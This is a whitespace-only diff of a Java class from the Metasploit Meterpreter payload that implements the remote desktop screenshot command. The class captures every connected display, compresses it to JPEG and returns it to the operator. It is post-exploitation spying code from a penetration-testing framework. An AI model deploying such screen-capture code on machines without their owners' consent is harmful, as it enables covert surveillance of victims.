@@ -18,28 +18,28 @@ import com.metasploit.meterpreter.command.Command;
 
 public class stdapi_ui_desktop_screenshot_V1_4 extends stdapi_ui_desktop_screenshot implements Command {
 
-	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
-		int quality = request.getIntValue(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY);
-		response.add(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT, grabScreen(quality));
-		return ERROR_SUCCESS;
-	}
+    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
+        int quality = request.getIntValue(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY);
+        response.add(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT, grabScreen(quality));
+        return ERROR_SUCCESS;
+    }
 
-	private byte[] grabScreen(int quality) throws Exception {
-		Rectangle screenBounds = new Rectangle();
-		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
-		for (int i = 0; i < devices.length; i++) {
-			screenBounds = screenBounds.union(devices[i].getDefaultConfiguration().getBounds());
-		}
-		ImageWriter writer = (ImageWriter) ImageIO.getImageWritersByFormatName("jpeg").next();
-		ImageWriteParam iwp = writer.getDefaultWriteParam();
-		if (quality >= 0 && quality <= 100) {
-			iwp.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
-			iwp.setCompressionQuality(quality / 100.0f);
-		}
-		ByteArrayOutputStream baos = new ByteArrayOutputStream();
-		writer.setOutput(ImageIO.createImageOutputStream(baos));
-		writer.write(null, new IIOImage(new Robot().createScreenCapture(screenBounds), null, null), iwp);
-		writer.dispose();
-		return baos.toByteArray();
-	}
+    private byte[] grabScreen(int quality) throws Exception {
+        Rectangle screenBounds = new Rectangle();
+        GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
+        for (int i = 0; i < devices.length; i++) {
+            screenBounds = screenBounds.union(devices[i].getDefaultConfiguration().getBounds());
+        }
+        ImageWriter writer = (ImageWriter) ImageIO.getImageWritersByFormatName("jpeg").next();
+        ImageWriteParam iwp = writer.getDefaultWriteParam();
+        if (quality >= 0 && quality <= 100) {
+            iwp.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
+            iwp.setCompressionQuality(quality / 100.0f);
+        }
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        writer.setOutput(ImageIO.createImageOutputStream(baos));
+        writer.write(null, new IIOImage(new Robot().createScreenCapture(screenBounds), null, null), iwp);
+        writer.dispose();
+        return baos.toByteArray();
+    }
 }
